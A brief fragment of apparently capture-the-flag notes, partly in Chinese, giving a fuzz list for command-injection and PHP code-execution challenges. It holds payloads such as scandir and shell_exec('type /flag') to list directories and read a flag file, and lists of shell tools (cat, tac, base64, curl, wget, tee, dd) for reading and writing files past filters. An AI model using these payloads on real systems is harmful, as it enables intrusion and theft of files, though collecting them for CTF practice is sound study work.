...
```
    ...
    - fuzz_list-regexbuddy测:
       ...
       php函数-- print_r(glob("*"));|var_dump(scandir('/');|var_dump(scandir(chr(47));|var_dump(shell_exec('type /flag'));
        ...
        文件写入 >|echo|printf|cat|tee file1 file2|`ls / |script xxx` |`echo "Hello, World" | dd of=output`|
        文件读取 cat|rev|more|tail|less|head|tac|sort|nl|hexdump|od|grep|base64|curl|wget|gcc
